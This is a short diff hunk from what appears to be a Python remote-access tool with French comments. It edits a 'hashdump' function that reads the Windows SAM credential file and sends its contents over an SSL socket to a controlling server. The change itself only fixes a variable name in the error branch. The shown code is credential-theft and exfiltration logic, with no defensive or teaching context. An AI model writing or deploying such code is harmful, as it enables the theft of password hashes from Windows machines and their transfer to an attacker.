@@ -126,7 +126,7 @@ def hashdump(ssl_socket):
         with open('C:/Windows/System32/config/SAM', 'r') as fichier_sam:
             hashdump_to_send = fichier_sam.read()
     else:
-        conf_to_send = "OS non reconnu" # Gestion d'erreur
+        hashdump_to_send = "OS non reconnu" # Gestion d'erreur
     ssl_socket.send(hashdump_to_send.encode())  # Envoie du fichier hashdump au serveur
 
 
